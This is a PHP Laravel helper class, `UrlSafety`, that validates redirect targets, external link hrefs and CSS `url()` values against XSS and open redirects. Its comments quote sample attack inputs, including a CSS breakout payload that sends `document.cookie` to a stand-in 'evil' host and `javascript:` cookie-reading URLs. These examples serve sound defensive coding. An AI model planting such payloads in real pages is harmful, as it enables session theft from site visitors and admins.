<?php

declare(strict_types=1);

namespace App\Support;

use Illuminate\Http\Request;

/**
 * URL safety helper — defends against open-redirect and `javascript:` /
 * `data:` / `vbscript:` / `file:` scheme XSS in redirect targets.
 *
 * Note: the previous `isSafeRedirect()` helper in
 * PublicFormController used `parse_url($t)['host'] ?? null` and then
 * treated `null` host as "relative URL — same-origin, always fine".
 * But `parse_url('javascript:alert(1)')` returns
 * `['scheme' => 'javascript', 'path' => 'alert(1)']` — no host — so a
 * tenant-admin who saves `redirect_url = 'javascript:alert(1)'` PASSED
 * the safety check, and the resulting `redirect()` would emit
 * `Location: javascript:alert(1)` (older browsers + embedded webviews
 * + some XHR-following clients still execute that). Even when the
 * `javascript:` scheme is blocked, an unvalidated tenant-supplied
 * absolute URL is an open-redirect / phishing surface.
 *
 * Use {@see isSafeRedirect()} everywhere user-supplied URLs land in a
 * `redirect(...)` call.
 *
 * NOTE: this is distinct from {@see \App\Support\UrlSafetyGuard} which
 * defends OUTBOUND HTTP egress (SSRF) for webhook deliveries.  Same
 * defensive posture, different attack surface.
 */
final class UrlSafety
{
    /**
     * Schemes acceptable in tenant-supplied redirect targets.
     * Anything else (javascript:, data:, vbscript:, file:, ftp:, …) is
     * rejected — those are XSS or unwanted-scheme vectors.
     */
    private const ALLOWED_SCHEMES = ['http', 'https'];

    /**
     * Return the URL if it's safe to interpolate inside a CSS `url(...)`
     * function (e.g. inside `<style>` or `style="..."` attribute), or
     * empty string if not safe.
     *
     * Note: even after URL scheme validation, the URL value
     * lives inside a CSS context where `'`, `"`, `)`, `;`, `{`, `}`, `\`
     * are CSS-special chars.  HTML-escaping via `{{ }}` does NOT protect
     * — browsers entity-decode `&#039;` back to `'` BEFORE the CSS parser
     * runs.  A tenant who sets a value like
     *   `https://x.png'); body{background:url('//evil/?'+document.cookie+');}`
     * survives http/https scheme validation and breaks out of the
     * `url(...)` call in a `<style>` block, exfiltrating visitor data.
     *
     * This helper combines:
     *   - http/https scheme allowlist (via isSafeExternalUrl)
     *   - strict CSS-special-char strip (rejects entire URL if ANY
     *     CSS-special char present — safer than partial sanitisation)
     */
    public static function cssSafeUrl(?string $url): string
    {
        if (! self::isSafeExternalUrl($url)) {
            return '';
        }
        // Reject the entire URL if it contains any CSS-special chars.
        // Legitimate http/https URLs don't need any of these — they'd
        // be % - encoded if they were part of a real query string.
        if (preg_match('/[\'"();{}\\\\\s]/', (string) $url)) {
            return '';
        }
        return (string) $url;
    }

    /**
     * Return TRUE iff the URL is safe to render as `href="..."` on an
     * external link (i.e. scheme is http or https only).
     *
     * Note: multiple admin views render user-controlled URLs
     * via `<a href="{{ $url }}">...</a>` without any scheme check.
     * Blade's `{{ }}` HTML-escapes BUT does not stop the `javascript:`
     * scheme (`:` is not a special HTML char).  A lead submitted via a
     * public form with `linkedin_url = "javascript:alert(document.cookie)"`,
     * or a custom URL field whose `filter_var($v, FILTER_VALIDATE_URL)`
     * happens to accept `javascript://comment%0Aalert(1)` (it does —
     * verified), runs JS in the admin Filament session when the admin
     * clicks the link.
     *
     * Use as: `@if(UrlSafety::isSafeExternalUrl($url)) <a href="{{ $url }}">...</a> @endif`
     * or as a Blade @php block guard.
     */
    public static function isSafeExternalUrl(?string $url): bool
    {
        if ($url === null || $url === '') {
            return false;
        }
        $scheme = parse_url($url, PHP_URL_SCHEME);
        if (! is_string($scheme)) {
            // Schemeless: could be protocol-relative (`//evil/x`) — reject.
            // Could be a relative path — also unusual for external links;
            // reject conservatively for href context (use safeRedirect for
            // same-origin relative URLs instead).
            return false;
        }
        return in_array(strtolower($scheme), self::ALLOWED_SCHEMES, true);
    }

    /**
     * Return TRUE iff the URL is a safe redirect target:
     *   - Relative URL with NO scheme + NO host (e.g. `/thanks`)        → safe
     *   - Absolute URL with http/https scheme AND a host that's either
     *     APP_URL host or the current request host                       → safe
     *   - Everything else (javascript:, data:, foreign host, malformed)  → unsafe
     *
     * The "current request host" check covers tenant-subdomain and
     * custom-domain setups where APP_URL is `https://app.example.com`
     * but the form was submitted from `https://tenant1.example.com` or
     * `https://forms.acme.test`.
     */
    public static function isSafeRedirect(string $target, ?Request $request = null): bool
    {
        if ($target === '') {
            return false;
        }

        $parts = parse_url($target);
        if ($parts === false) {
            return false;
        }

        $scheme = isset($parts['scheme']) ? strtolower($parts['scheme']) : null;

        // Reject any scheme we don't explicitly allow.  Notably this
        // blocks `javascript:`, `data:`, `vbscript:`, `file:`, `ftp:`.
        if ($scheme !== null && ! in_array($scheme, self::ALLOWED_SCHEMES, true)) {
            return false;
        }

        $host = $parts['host'] ?? null;

        // Relative URL: no scheme + no host.  Same-origin by definition.
        // BUT: protocol-relative URLs (`//evil.example.com/path`) have
        // a host without a scheme — parse_url puts the leading host in
        // the `path` field on some PHP versions.  Defend by rejecting
        // any path starting with `//`.
        if ($host === null && $scheme === null) {
            $path = $parts['path'] ?? '';
            if (str_starts_with($path, '//')) {
                return false;
            }
            return true;
        }

        // Absolute URL: scheme is http/https (verified above), host
        // must match APP_URL host or the current request host.
        if ($host !== null) {
            $allowed = array_filter([
                parse_url((string) config('app.url'), PHP_URL_HOST),
                $request?->getHost(),
            ]);
            $hostLower = strtolower($host);
            foreach ($allowed as $allowedHost) {
                if (strtolower((string) $allowedHost) === $hostLower) {
                    return true;
                }
            }
            return false;
        }

        // Scheme without host (e.g. mailto: foo@bar — but mailto is
        // already rejected above).  Defensive default-deny.
        return false;
    }
}
